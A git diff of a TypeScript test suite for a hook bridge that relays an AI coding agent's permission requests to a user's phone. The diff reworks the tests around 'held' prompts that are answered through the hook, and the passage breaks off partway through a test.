@@ -2,20 +2,25 @@ import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
 import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
-import type { ProtocolMessage, Question, UUID } from '@remi/shared';
-import { generateId } from '@remi/shared';
+import type { ProtocolMessage, Question, QuestionOption, UUID } from '@remi/shared';
+import { PROMPT_WAITING_HELD_MESSAGE, generateId } from '@remi/shared';
+import { hasLiveQuestionOnScreen } from '../../../src/api/live-questions.ts';
 import { MessageAPI } from '../../../src/api/message-api.ts';
-import {
-  type PushQuestion,
-  QuestionPresenceTracker,
-} from '../../../src/api/question-presence-tracker.ts';
+import { QuestionPresenceTracker } from '../../../src/api/question-presence-tracker.ts';
 import { SubagentViewRegistry } from '../../../src/api/subagent-view-registry.ts';
-import { createInputHandlers, trackerScreenDeps } from '../../../src/cli/handlers/input-events.ts';
+import {
+  createInputHandlers,
+  gateAnswerDeps,
+  trackerScreenDeps,
+} from '../../../src/cli/handlers/input-events.ts';
 import { __resetLoggerForTests, configureLogger } from '../../../src/cli/logger.ts';
 import type { HookBridgeHandle } from '../../../src/cli/session-phases/hook-bridge-setup.ts';
-import { setupHookBridge } from '../../../src/cli/session-phases/hook-bridge-setup.ts';
+import {
+  setupHookBridge,
+  terminalNoticeReason,
+} from '../../../src/cli/session-phases/hook-bridge-setup.ts';
 import { REMI_REGISTERED_HOOK_EVENTS } from '../../../src/hooks/hook-types.ts';
-import type { HookServer } from '../../../src/hooks/index.ts';
+import type { HookServer, PermissionDecision } from '../../../src/hooks/index.ts';
 import { selectPushCategory } from '../../../src/notifications/notification-dispatcher.ts';
 import { parseQuestion } from '../../../src/parser/question-parser.ts';
 import type { PTYSession } from '../../../src/pty/pty-session.ts';
@@ -37,14 +42,18 @@ import {
 class RecordingHookServer {
   readonly listeners = new Map<string, (input: unknown) => void>();
   /** The synchronous PermissionRequest resolver (#496); set via setPermissionResolver. */
-  permissionResolver: ((input: unknown) => Promise<string>) | null = null;
+  permissionResolver:
+    | ((input: unknown, signal: AbortSignal) => Promise<PermissionDecision>)
+    | null = null;
   on(event: string, listener: (input: unknown) => void): () => void {
     // Only the last listener per event survives; for setupHookBridge this is
     // fine because it installs exactly one per event name.
     this.listeners.set(event, listener);
     return () => this.listeners.delete(event);
   }
-  setPermissionResolver(resolver: ((input: unknown) => Promise<string>) | null): void {
+  setPermissionResolver(
+    resolver: ((input: unknown, signal: AbortSignal) => Promise<PermissionDecision>) | null,
+  ): void {
     this.permissionResolver = resolver;
   }
   fire(event: string, input: unknown): void {
@@ -54,7 +63,7 @@ class RecordingHookServer {
     // SYNCHRONOUSLY inside the resolver before the async decision, which we
     // fire-and-forget here. Decision-asserting tests use `await firePermission`.
     if (event === 'PermissionRequest' && !this.listeners.has(event) && this.permissionResolver) {
-      void this.permissionResolver(input);
+      void this.permissionResolver(input, new AbortController().signal);
       return;
     }
     const fn = this.listeners.get(event);
@@ -62,21 +71,28 @@ class RecordingHookServer {
     fn(input);
   }
   /** Fire a PermissionRequest through the synchronous resolver (#496) and return
-   *  the decision ('allow' | 'deny' | 'passthrough'). */
-  async firePermission(input: unknown): Promise<string> {
+   *  the decision. A held prompt's decision settles only when it is answered
+   *  or released (#1126), so callers holding one must not await it first. */
+  async firePermission(
+    input: unknown,
+    signal: AbortSignal = new AbortController().signal,
+  ): Promise<PermissionDecision> {
     if (!this.permissionResolver) throw new Error('No permission resolver registered');
-    return this.permissionResolver(input);
+    return this.permissionResolver(input, signal);
   }
 }
 
-/** PTYSession fake that records submitInput calls. Since #1125 nothing in
- *  the bridge types into the PTY on its own, so most tests assert it stays
- *  empty; the push-on-render tests assert the phone's answer reaches it. */
+/** PTYSession fake that records every keystroke path: `submitInput` calls
+ *  as-is and raw `write` calls prefixed `write:` (an Esc, a runner key). A
+ *  held prompt is answered through its hook (#1126), so its tests assert this
+ *  stays empty; the typed-answer tests assert exactly what reached it. */
 function fakePTY(submits: string[]): PTYSession {
   return {
     id: generateId(),
     isRunning: true,
-    write: () => {},
+    write: async (data: string) => {
+      submits.push(`write:${data}`);
+    },
     submitInput: async (content: string) => {
       submits.push(content);
     },
@@ -130,23 +146,6 @@ class PassthroughTracker extends QuestionPresenceTracker {
 
 function makePassthroughTracker(api: MessageAPI): PassthroughTracker {
   return new PassthroughTracker((q) => api.handleQuestion(q));
-}
-
-/**
- * PassthroughTracker whose parked subagent prompts RENDER at once: the card is
- * pushed under the parked question's id, as the real render pairing does when
- * it adopts the hook record's identity. Lets an external-resolution test drive
- * a parked card that actually reached the registry (#1125: the gate only
- * broadcasts a dismissal for a card that was registered).
- */
-class RenderedParkTracker extends PassthroughTracker {
-  constructor(private readonly pushNow: PushQuestion) {
-    super(pushNow);
-  }
-
-  override parkAwaitingPTY(question: Question): void {
-    this.pushNow(question);
-  }
 }
 
 const SID = 'a1b2c3d4-e5f6-7890-abcd-ef0123456789' as UUID;
@@ -230,9 +229,6 @@ describe('setupHookBridge', () => {
        *  contract through the bridge wiring. Defaults to the passthrough
        *  tracker used by the legacy assertion-style tests. */
       realTracker?: boolean;
-      /** Parked subagent prompts render (and push) at once; see
-       *  `RenderedParkTracker`. Ignored with `realTracker`. */
-      parkedRenders?: boolean;
       /** Shorten `QuestionPresenceTracker`'s orphan-PTY debounce (default
        *  1.5s) so a test can drive the real hooked-session orphan path without
        *  a long wait. Only meaningful with `realTracker`. */
@@ -281,8 +277,16 @@ describe('setupHookBridge', () => {
       /** Record every push the REAL tracker makes, with its `held` flag.
        *  Only meaningful with `realTracker`. */
       pushLog?: Array<{ question: Question; held: boolean }>;
+      /** Hold deadline for binary prompts (#1126); default 60 s. */
+      holdMs?: number;
+      /** Record every terminal notice pushed or dismissed (#1126). */
+      noticeLog?: Array<{ questionId: UUID; text: string; reason: string }>;
+      /** Wrapper mode (true, the default) or daemon/hub mode (#1126). */
+      hasLocalTerminal?: boolean;
+      /** The harness_denied sink (#1126). */
+      onHarnessDenied?: (input: unknown) => void;
     } = {},
-  ): { tracker: QuestionPresenceTracker; messageApi: MessageAPI } {
+  ): { tracker: QuestionPresenceTracker; messageApi: MessageAPI; handle: HookBridgeHandle } {
     const sessionWorkingDirectory = opts.workingDirectory ?? tmpDir;
     const localMessageApi: MessageAPI = opts.realMessageApi
       ? new MessageAPI(
@@ -303,6 +307,9 @@ describe('setupHookBridge', () => {
             ? { throwOnQuestionTimes: opts.throwOnQuestionTimes }
             : {},
         );
+    // The tracker is built before the bridge that owns the gate, so its
+    // live-question check reads the handle lazily, as cli.ts does.
+    const handleRef: { current?: HookBridgeHandle } = {};
     const tracker: QuestionPresenceTracker = opts.realTracker
       ? new QuestionPresenceTracker(
           (q, pushOpts) => {
@@ -319,8 +326,13 @@ describe('setupHookBridge', () => {
                   : {}),
                 ...(opts.liveQuestionDeps
                   ? {
+                      // Wired exactly as cli.ts wires it.
                       hasLiveQuestions: () =>
-                        (sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0) > 0,
+                        hasLiveQuestionOnScreen(
+                          sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [],
+                          (questionId) =>
+                            handleRef.current?.gate.isHeld(questionId as UUID) ?? false,
+                        ),
                       onHooklessQuestionGone: (questionId: string, reason: string) => {
                         sessionRegistry.removeQuestion(
                           SID,
@@ -335,9 +347,7 @@ describe('setupHookBridge', () => {
               }
             : undefined,
         )
-      : opts.parkedRenders
-        ? new RenderedParkTracker((q) => localMessageApi.handleQuestion(q))
-        : makePassthroughTracker(localMessageApi);
+      : makePassthroughTracker(localMessageApi);
     sessionRegistry.registerSession(
       SID,
       sessionWorkingDirectory,
@@ -357,6 +367,17 @@ describe('setupHookBridge', () => {
         transcriptFallbackTimers,
         currentPort: () => 8765,
         transcriptDiscovery: new TranscriptDiscovery(),
+        holdMs: opts.holdMs ?? 60_000,
+        hookTimeoutMs: (opts.hasLocalTerminal ?? true) ? 600_000 : 3_600_000,
+        ...(opts.onHarnessDenied ? { onHarnessDenied: opts.onHarnessDenied } : {}),
+        ...(opts.noticeLog
+          ? {
+              pushTerminalNotice: (_sid: UUID, question: Question, reason: string) =>
+                opts.noticeLog?.push({ questionId: question.id, text: question.text, reason }),
+              dismissTerminalNotice: (_sid: UUID, questionId: UUID) =>
+                opts.noticeLog?.push({ questionId, text: '', reason: 'dismissed' }),
+            }
+          : {}),
         ...(opts.subagentViews ? { subagentViews: opts.subagentViews } : {}),
         ...(opts.broadcastResolvedLog
           ? {
@@ -387,10 +408,12 @@ describe('setupHookBridge', () => {
         // through the bridge). Pure PTY-presence semantics are validated
         // in tests/api/question-presence-tracker.test.ts.
         tracker,
+        hasLocalTerminal: opts.hasLocalTerminal ?? true,
       },
     );
+    handleRef.current = handle;
     bridgeHandles.push(handle);
-    return { tracker, messageApi: localMessageApi };
+    return { tracker, messageApi: localMessageApi, handle };
   }
 
   test('registers a .on() listener for every REMI_REGISTERED_HOOK_EVENTS entry except the resolver-installed PermissionRequest (#927)', () => {
@@ -781,26 +804,24 @@ describe('setupHookBridge', () => {
       exitCode: null,
     });
 
-    build();
+    const { handle } = build();
 
-    // Hot-switched PTY presence so the subagent gate doesn't shadow this
-    // assertion (irrelevant to the lock-adoption check itself).
     // The first hook arrives WHILE hasSiblingInDir is still true. Pre-fix
     // this dropped silently. Post-fix, adoptLockFromStore pulls the lock
     // from sessionStore and filterBySession returns true.
     // If the lock was adopted, the event is admitted and the gate escalates
-    // it, emitting a question. If not (regression), it is dropped as foreign:
-    // also 'passthrough', but with no question. So the emitted question proves
-    // adoption (#1125: before the evaluator was removed, the proof was an
-    // 'allow' verdict).
-    const decision = await hookServer.firePermission({
+    // it, emitting a question and holding the hook (#1126). If not
+    // (regression), it is dropped as foreign: 'passthrough' at once, with no
+    // question. So the emitted question proves adoption.
+    const decision = hookServer.firePermission({
       session_id: 'claude-mine-via-fallback',
       hook_event_name: 'PermissionRequest',
       tool_name: 'Bash',
       tool_input: { command: 'ls' },
     });
-    expect(decision).toBe('passthrough');
     expect(messageApiLog.questionCalls).toBe(1);
+    handle.gate.forceRelease('test');
+    expect(await decision).toBe('passthrough');
     expect(ptySubmits).toEqual([]);
   });
 
@@ -890,19 +911,21 @@ describe('setupHookBridge', () => {
     test('does NOT call handleUnadmitted when the PermissionRequest IS admitted (our own session)', async () => {
       bindOurSession();
       const foreignEscalationLog: Array<{ input: unknown; sessionId: UUID }> = [];
-      build({ foreignEscalationLog });
+      const { handle } = build({ foreignEscalationLog });
 
-      const decision = await hookServer.firePermission({
+      const decision = hookServer.firePermission({
         session_id: 'claude-mine',
         hook_event_name: 'PermissionRequest',
         tool_name: 'Bash',
         tool_input: { command: 'ls' },
       });
 
-      // Admitted: the gate escalated it (a question was emitted).
-      expect(decision).toBe('passthrough');
+      // Admitted: the gate escalated it (a question was emitted) and holds
+      // the hook (#1126).
       expect(messageApiLog.questionCalls).toBe(1);
       expect(foreignEscalationLog).toHaveLength(0);
+      handle.gate.forceRelease('test');
+      expect(await decision).toBe('passthrough');
     });
 
     test('with no foreignSessionEscalator wired, a foreign PermissionRequest still passes through cleanly (no throw)', async () => {
@@ -952,18 +975,16 @@ describe('setupHookBridge', () => {
       exitCode: null,
     });
 
-    build();
+    const { handle } = build();
 
     // Initial adoption: hook for claude-A is admitted -> escalated, so the
-    // gate emits a question (a dropped foreign hook emits none).
-    expect(
-      await hookServer.firePermission({
-        session_id: 'claude-A-initial',
-        hook_event_name: 'PermissionRequest',
-        tool_name: 'Bash',
-        tool_input: { command: 'ls' },
-      }),
-    ).toBe('passthrough');
+    // gate emits a question (a dropped foreign hook emits none) and holds.
+    const first = hookServer.firePermission({
+      session_id: 'claude-A-initial',
+      hook_event_name: 'PermissionRequest',
+      tool_name: 'Bash',
+      tool_input: { command: 'ls' },
+    });
     expect(messageApiLog.questionCalls).toBe(1);
 
     // Fallback rediscovers after /clear and writes the new id.
@@ -981,16 +1002,63 @@ describe('setupHookBridge', () => {
     // Hook for claude-B: the lock must re-adopt; otherwise it is dropped as
     // foreign with no question. A second question proves the rotation was
     // picked up.
-    expect(
-      await hookServer.firePermission({
-        session_id: 'claude-B-rotated',
+    const second = hookServer.firePermission({
+      session_id: 'claude-B-rotated',
+      hook_event_name: 'PermissionRequest',
+      tool_name: 'Bash',
+      tool_input: { command: 'pwd' },
+    });
+    expect(messageApiLog.questionCalls).toBe(2);
+    handle.gate.forceRelease('test');
+    expect(await first).toBe('passthrough');
+    expect(await second).toBe('passthrough');
+    expect(ptySubmits).toEqual([]);
+  });
+
+  test('a rotation with no SessionEnd (a port-marker reclaim) still releases a live hold: the rotation sweep itself (#1126)', async () => {
+    // The usual rotation arrives after a SessionEnd, whose own sweep would
+    // hide a missing rotation sweep. A stale-lock reclaim (#518) rotates
+    // with nothing else firing: an event for an unknown id whose transcript
+    // carries OUR port marker.
+    const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
+    build({ realMessageApi: true, broadcastResolvedLog });
+    hookServer.fire('Notification', {
+      session_id: 'claude-sweep-A',
+      transcript_path: path.join(tmpDir, 'sweep-a.jsonl'),
+      hook_event_name: 'Notification',
+      notification_type: 'auth_success',
+      message: '',
+    });
+    let settled = false;
+    const first = hookServer
+      .firePermission({
+        session_id: 'claude-sweep-A',
         hook_event_name: 'PermissionRequest',
         tool_name: 'Bash',
-        tool_input: { command: 'pwd' },
-      }),
-    ).toBe('passthrough');
-    expect(messageApiLog.questionCalls).toBe(2);
-    expect(ptySubmits).toEqual([]);
+        tool_input: { command: 'ls' },
+      })
+      .then((d) => {
+        settled = true;
+        return d;
+      });
+    const card = [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])][0];
+    if (!card) throw new Error('no held card');
+    const transcriptB = path.join(tmpDir, 'sweep-b.jsonl');
+    fs.writeFileSync(
+      transcriptB,
+      `${JSON.stringify({ type: 'custom-title', customTitle: 'remi:8765' })}\n`,
+    );
+    hookServer.fire('Notification', {
+      session_id: 'claude-sweep-B',
+      transcript_path: transcriptB,
+      hook_event_name: 'Notification',
+      notification_type: 'auth_success',
+      message: '',
+    });
+    expect(await first).toBe('passthrough');
+    expect(settled).toBe(true);
+    expect(broadcastResolvedLog.map((r) => r.questionId)).toContain(card.id);
+    expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
   });
 
   test('adoptLockFromStore catches sessionStore throws and keeps the daemon running', () => {
@@ -1109,14 +1177,12 @@ describe('setupHookBridge', () => {
   // structurally in question-presence-tracker.test.ts.
   // -------------------------------------------------------------------------
 
-  test('Phase 3 wiring: PreToolUse drives tracker.onStatusChange and clears pending', () => {
-    // A PermissionRequest stashes the question in the tracker via
-    // onQuestion → recordPendingHook. A subsequent PreToolUse must drive
-    // tracker.onStatusChange('executing') through the bridge's
-    // onStatusChange wiring and clear the pending slot. Without this,
-    // a refactor that disconnects tracker.onStatusChange from the
-    // bridge would leave stale pending records that merge wrong option
-    // labels onto unrelated future PTY prompts.
+  test('Phase 3 wiring: PreToolUse drives tracker.onStatusChange (the observed prompt clears)', () => {
+    // A subsequent PreToolUse must drive tracker.onStatusChange('executing')
+    // through the bridge's onStatusChange wiring. Without it, a refactor
+    // that disconnects tracker.onStatusChange from the bridge would leave
+    // the screen observation stale, and the answer guards would read a
+    // prompt as still on screen after Claude moved past it.
     const { tracker } = build({ realTracker: true });
 
     hookServer.fire('Notification', {
@@ -1126,15 +1192,8 @@ describe('setupHookBridge', () => {
       notification_type: 'auth_success',
       message: '',
     });
-
-    hookServer.fire('PermissionRequest', {
-      session_id: 'claude-locked-wire-1',
-      hook_event_name: 'PermissionRequest',
-      tool_name: 'Bash',
-      tool_input: { command: 'ls' },
-    });
-
-    expect(tracker.hasPendingForTest()).toBe(true);
+    tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
+    expect(tracker.isPromptObservedOnPTY()).toBe(true);
 
     hookServer.fire('PreToolUse', {
       session_id: 'claude-locked-wire-1',
@@ -1143,7 +1202,29 @@ describe('setupHookBridge', () => {
       tool_input: { file_path: '/tmp/x.ts' },
     });
 
+    expect(tracker.isPromptObservedOnPTY()).toBe(false);
+  });
+
+  test('a held prompt leaves no pending record: its card is pushed at hook time (#1126)', () => {
+    const pushLog: Array<{ question: Question; held: boolean }> = [];
+    const { tracker, handle } = build({ realTracker: true, pushLog });
+    hookServer.fire('Notification', {
+      session_id: 'claude-locked-wire-2',
+      hook_event_name: 'Notification',
+      transcript_path: path.join(tmpDir, 'wire2.jsonl'),
+      notification_type: 'auth_success',
+      message: '',
+    });
+    hookServer.fire('PermissionRequest', {
+      session_id: 'claude-locked-wire-2',
+      hook_event_name: 'PermissionRequest',
+      tool_name: 'Bash',
+      tool_input: { command: 'ls' },
+    });
     expect(tracker.hasPendingForTest()).toBe(false);
+    expect(pushLog).toHaveLength(1);
+    expect(pushLog[0]?.held).toBe(true);
+    handle.gate.forceRelease('test');
   });
 
   test('Phase 3 wiring: SessionStart restart clears tracker.pending', () => {
@@ -1162,11 +1243,15 @@ describe('setupHookBridge', () => {
       message: '',
     });
 
+    // A parked subagent prompt is the record that waits in `pending` (a
+    // main prompt's card is pushed at hook time, #1126).
     hookServer.fire('PermissionRequest', {
       session_id: 'claude-restart-A',
       hook_event_name: 'PermissionRequest',
       tool_name: 'Bash',
       tool_input: { command: 'ls' },
+      agent_id: 'agent-restart',
+      agent_type: 'general-purpose',
     });
 
     expect(tracker.hasPendingForTest()).toBe(true);
@@ -1225,13 +1310,11 @@ describe('setupHookBridge', () => {
     expect(tracker.hasPendingForTest()).toBe(false);
   });
 
-  test("Phase 2 + Phase 3: mixed-shape suggestions pair through the hook->tracker->push merge, the screen's options win", async () => {
-    // pr-test-analyzer Gap 3: phase 2 filters object entries out of
-    // permission_suggestions; phase 3 merges the hook record onto the PTY
-    // question. Both layers are tested in isolation; this covers the chain
-    // end-to-end through the real bridge wiring. Since #1134 the merge takes
-    // the hook's text and identity but keeps the screen's options: the card
-    // is answered by typing an option value into that screen.
+  test('mixed-shape suggestions: a held card is built by meaning, pushed at once, never from the screen (#1126)', async () => {
+    // pr-test-analyzer Gap 3, end to end through the real bridge wiring.
+    // Since #1126 a binary card is answered through its held hook, so its
+    // options come from the suggestions by meaning, never from the screen,
+    // and the dialog's render is not merged into it.
     const pushed: Question[] = [];
     const localApi = fakeMessageAPI(messageApiLog);
     sessionRegistry.registerSession(SID, tmpDir, fakePTY(ptySubmits), localApi);
@@ -1240,30 +1323,32 @@ describe('setupHookBridge', () => {
       return undefined;
     });
 
-    bridgeHandles.push(
-      setupHookBridge(
-        {
-          sessionRegistry,
-          bindingStore,
-          liveSessionsRegistry,
-          transcriptWatchers: transcriptWatchers as unknown as Map<
-            UUID,
-            import('../../../src/transcript/transcript-watcher.ts').TranscriptWatcher
-          >,
-          transcriptFallbackTimers,
-          currentPort: () => 8765,
-          transcriptDiscovery: new TranscriptDiscovery(),
-        },
-        {
-          hookServer: hookServer as unknown as HookServer,
-          sessionId: SID,
-          workingDirectory: tmpDir,
-          messageApi: localApi,
-          sendAndRecord: () => {},
-          tracker,
-        },
-      ),
+    const handle = setupHookBridge(
+      {
+        sessionRegistry,
+        bindingStore,
+        liveSessionsRegistry,
+        transcriptWatchers: transcriptWatchers as unknown as Map<
+          UUID,
+          import('../../../src/transcript/transcript-watcher.ts').TranscriptWatcher
+        >,
+        transcriptFallbackTimers,
+        currentPort: () => 8765,
+        transcriptDiscovery: new TranscriptDiscovery(),
+        holdMs: 60_000,
+        hookTimeoutMs: 600_000,
+      },
+      {
+        hookServer: hookServer as unknown as HookServer,
+        sessionId: SID,
+        workingDirectory: tmpDir,
+        messageApi: localApi,
+        sendAndRecord: () => {},
+        tracker,
+        hasLocalTerminal: true,
+      },
     );
+    bridgeHandles.push(handle);
 
     hookServer.fire('Notification', {
       session_id: 'claude-mixed',
@@ -1273,10 +1358,10 @@ describe('setupHookBridge', () => {
       message: '',
     });
 
-    // The gate escalates every main-agent request (#1125): escalateToUser
-    // calls handlePermissionRequest -> onQuestion ->
-    // tracker.recordPendingHook with the filtered options.
-    hookServer.fire('PermissionRequest', {
+    // The gate holds a binary main-agent request (#1126): escalateToUser
+    // calls handlePermissionRequest -> onQuestion -> tracker.recordPendingHook,
+    // and the hold pushes that record at once by id.
+    const hook = hookServer.firePermission({
       session_id: 'claude-mixed',
       hook_event_name: 'PermissionRequest',
       tool_name: 'Edit',
@@ -1284,10 +1369,20 @@ describe('setupHookBridge', () => {
       permission_suggestions: [{ type: 'addDirectories', directories: ['/tmp'] }, 'Yes', 'No'],
     });
 
-    expect(tracker.hasPendingForTest()).toBe(true);
+    expect(tracker.hasPendingForTest()).toBe(false);
+    expect(pushed.length).toBe(1);
+    expect(pushed[0]?.source).toBe('permission_request');
+    expect(pushed[0]?.text).toBe('Allow Edit: /tmp/x.ts');
+    // Neither the plain strings nor addDirectories name a grant a held card
+    // can echo, so the card is the honest Yes/No pair.
+    expect(pushed[0]?.options.map((o) => [o.label, o.isYes, o.isNo])).toEqual([
+      ['Yes', true, false],
+      ['No', false, true],
+    ]);
 
-    // PTY confirms the prompt is on screen with its own numbered options.
-    const screen: Question = {
+    // The dialog renders during the hold: an echo of the open hook prompt,
+    // never merged into a second card.
+    tracker.onOrphanPTYPrompt({
       id: generateId(),
       text: 'Allow Edit: /tmp/x.ts?',
       options: [
@@ -1296,14 +1391,10 @@ describe('setupHookBridge', () => {
       ],
       allowsFreeText: false,
       isAnswered: false,
-    };
-    tracker.onPTYPromptVisible(screen);
-
+    });
     expect(pushed.length).toBe(1);
-    // The hook record paired: its text and source, the screen's options.
-    expect(pushed[0]?.source).toBe('permission_request');
-    expect(pushed[0]?.text).toBe('Allow Edit: /tmp/x.ts');
-    expect(pushed[0]?.options).toEqual(screen.options);
+    handle.gate.forceRelease('test');
+    expect(await hook).toBe('passthrough');
   });
 
   // -------------------------------------------------------------------------
@@ -1312,87 +1403,12 @@ describe('setupHookBridge', () => {
   // tracker; push is gated by PTY presence, not by the agent_id tag.
   // -------------------------------------------------------------------------
 
-  test('Phase 4 wiring: subagent PermissionRequest + PTY-visible prompt fires a push', async () => {
-    // The user hot-switches to a subagent's view; the subagent's prompt
-    // is on the user's PTY screen. The hook fires with agent_id set.
-    // Under the new contract, this is an answerable prompt: tracker
-    // records the hook, PTY confirms, push fires with merged metadata.
-    const pushed: Question[] = [];
-    const localApi = fakeMessageAPI(messageApiLog);
-    sessionRegistry.registerSession(SID, tmpDir, fakePTY(ptySubmits), localApi);
-    const tracker = new QuestionPresenceTracker((q) => {
-      pushed.push(q);
-      return undefined;
-    });
-
-    bridgeHandles.push(
-      setupHookBridge(
-        {
-          sessionRegistry,
-          bindingStore,
-          liveSessionsRegistry,
-          transcriptWatchers: transcriptWatchers as unknown as Map<
-            UUID,
-            import('../../../src/transcript/transcript-watcher.ts').TranscriptWatcher
-          >,
-          transcriptFallbackTimers,
-          currentPort: () => 8765,
-          transcriptDiscovery: new TranscriptDiscovery(),
-        },
-        {
-          hookServer: hookServer as unknown as HookServer,
-          sessionId: SID,
-          workingDirectory: tmpDir,
-          messageApi: localApi,
-          sendAndRecord: () => {},
-          tracker,
-        },
-      ),
-    );
-
-    hookServer.fire('Notification', {
-      session_id: 'claude-sub-A',
-      hook_event_name: 'Notification',
-      transcript_path: path.join(tmpDir, 'subA.jsonl'),
-      notification_type: 'auth_success',
-      message: '',
-    });
-
-    hookServer.fire('PermissionRequest', {
-      session_id: 'claude-sub-A',
-      agent_id: 'subagent-A',
-      agent_type: 'general-purpose',
-      hook_event_name: 'PermissionRequest',
-      tool_name: 'Edit',
-      tool_input: { file_path: '/tmp/foo.ts' },
-      permission_suggestions: ['Yes', 'Always', 'No'],
-    });
-
-    // Hook recorded the question in the tracker (no push yet).
-    expect(tracker.hasPendingForTest()).toBe(true);
-    expect(pushed.length).toBe(0);
-
-    // PTY parser confirms the prompt is on the user's terminal.
-    const screen: Question = {
-      id: generateId(),
-      text: 'Allow Edit: /tmp/foo.ts?',
-      options: [
-        { label: '1', value: '1', isRecommended: false, isYes: false, isNo: false },
-        { label: '2', value: '2', isRecommended: false, isYes: false, isNo: false },
-        { label: '3', value: '3', isRecommended: false, isYes: false, isNo: false },
-      ],
-      allowsFreeText: false,
-      isAnswered: false,
-    };
-    tracker.onPTYPromptVisible(screen);
-
-    expect(pushed.length).toBe(1);
-    // Merged metadata: the subagent's agent and named text, the screen's
-    // options (#1134).
-    expect(pushed[0]?.agentId).toBe('subagent-A');
-    expect(pushed[0]?.text).toBe('general-purpose · Edit: /tmp/foo.ts');
-    expect(pushed[0]?.options).toEqual(screen.options);
-  });
+  // (#1126 review) The test that drove a subagent prompt through the
+  // non-hooked `onPTYPromptVisible` core and expected an answerable card was
+  // removed: production routes a hooked session's renders through
+  // `onOrphanPTYPrompt`, and a wrapper-mode subagent prompt gets a notice,
+  // never a card (see "wrapper mode: passthrough, a notice when the dialog
+  // renders").
 
   test('Phase 4 wiring: subagent PermissionRequest with no PTY confirmation drops cleanly', async () => {
     // Background subagent path: hook fires (agent_id set), no PTY emit
@@ -1420,6 +1436,8 @@ describe('setupHookBridge', () => {
           transcriptFallbackTimers,
           currentPort: () => 8765,
           transcriptDiscovery: new TranscriptDiscovery(),
+          holdMs: 60_000,
+          hookTimeoutMs: 600_000,
         },
         {
           hookServer: hookServer as unknown as HookServer,
@@ -1428,6 +1446,7 @@ describe('setupHookBridge', () => {
           messageApi: localApi,
           sendAndRecord: () => {},
           tracker,
+          hasLocalTerminal: true,
         },
       ),
     );
@@ -1575,25 +1594,18 @@ describe('setupHookBridge', () => {
     expect(questions[0]?.source).toBe('pty');
   });
 
-  describe('unheld binary main-agent prompts push on render (#1121)', () => {
-    // A Claude permission dialog as the terminal shows it, fed through the
-    // real parser (`parseQuestion` is what OutputProcessor emits from).
-    function claudeDialog(command: string): Question {
-      const screen = [
-        ' Bash command',
-        '',
-        `   ${command}`,
-        '   Run the command',
-        '',
-        ' Do you want to proceed?',
-        ' ❯ 1. Yes',
-        "   2. Yes, and don't ask again for this command",
-        '   3. No, and tell Claude what to do differently (esc)',
-      ].join('\n');
-      const parsed = parseQuestion(screen);
-      if (!parsed.question) throw new Error('fixture did not parse as a prompt');
-      return parsed.question;
-    }
+  /**
+   * #1126, end to end through the real bridge, gate, tracker, MessageAPI and
+   * answer handler (wired with `gateAnswerDeps` + `trackerScreenDeps`, the
+   * helpers cli.ts uses): a binary main-agent prompt holds its hook, its card
+   * is pushed at hook time, and a phone answer becomes the hook response.
+   * Nothing is ever typed into the PTY for it.
+   */
+  describe('held binary prompts answer through the hook (#1126)', () => {
+    const E5_SUGGESTIONS = [
+      { type: 'addDirectories', directories: [WRAPPED_DIRECTORY], destination: 'session' },
+      { type: 'setMode', mode: 'acceptEdits', destination: 'session' },
+    ];
 
     function lockSession(id: string): void {
       hookServer.fire('Notification', {
@@ -1605,145 +1617,886 @@ describe('setupHookBridge', () => {
       });
     }
 
-    function bash(id: string, command: string) {
-      return hookServer.firePermission({
-        session_id: id,
-        hook_event_name: 'PermissionRequest',
-        tool_name: 'Bash',
-        tool_input: { command },
-      });
-    }
-
     function cards(): Question[] {
       return [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
     }
 
-    async function waitFor(pred: () => boolean): Promise<void> {
-      const deadline = Date.now() + 2000;
-      while (!pred() && Date.now() < deadline) {
-        await new Promise((resolve) => setTimeout(resolve, 5));
-      }
+    function held(
+      sessionTag: string,
+      over: Record<string, unknown> = {},
+      opts: Parameters<typeof build>[0] = {},
+    ) {
+      const built = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        ...opts,
+      });
+      lockSession(sessionTag);
+      const hook = hookServer.firePermission({
+        session_id: sessionTag,
+        hook_event_name: 'PermissionRequest',
+        tool_name: 'Bash',
+        tool_input: { command: 'touch e5-marker.txt' },
+        ...over,
+      });
+      const card = cards()[0];
+      if (!card) throw new Error('the held prompt pushed no card');
+      const sent: ProtocolMessage[] = [];
+      const handlers = createInputHandlers({
+        sessionRegistry,
+        bindingStore,
+        send: (_c, m) => {
+          sent.push(m);
+          return true;
+        },
+        ...gateAnswerDeps(() => built.handle.gate),
+        ...trackerScreenDeps(() => built.tracker),
+      });
+      return { ...built, hook, card, handlers, sent };
     }
 
-    test("a binary prompt with no usable hook suggestions reaches the phone when it renders, with the screen's three options", async () => {
-      // Nothing holds the hook (#1125; before it, the default install with
-      // auto_approve.enabled = false), so the gate answers 'passthrough' and
-      // Claude renders its native prompt at once.
-      // Before `pushOnRender`, the stashed hook record made `isGateOwnedCycle`
-      // read that render as already pushed and suppress it: the card never
-      // reached the phone. Driven through `onOrphanPTYPrompt`, the routing
-      // cli.ts uses when a hook server is active.
-      const { tracker } = build({
+    test('the card is pushed at hook time with options by meaning, before any render', async () => {
+      const { card, hook, handle } = held('claude-held-card', {
+        permission_suggestions: E5_SUGGESTIONS,
+      });
+      // addDirectories is never offered; setMode is the standing option.
+      expect(card.options.map((o) => [o.label, o.isYes, o.isNo, o.suggestionIndex])).toEqual([
+        ['Yes', true, false, undefined],
+        ['Yes, and switch to acceptEdits mode', true, false, 1],
+        ['No', false, true, undefined],
+      ]);
+      // A mode switch is not what the lock screen's static "Yes, always"
+      // says, so this card is answered in the app (#1126 lead decision).
+      expect(selectPushCategory(card.options)).toBeUndefined();
+      expect(card.text).toBe('Allow Bash: touch e5-marker.txt');
+      handle.gate.forceRelease('test');
+      expect(await hook).toBe('passthrough');
+    });
+
+    test('phone Yes resolves the hold with allow; nothing typed, the card is consumed', async () => {
+      const { card, hook, handlers } = held('claude-held-yes');
+      const outcome = await handlers.relayAnswer(SID, card.id, 'Yes');
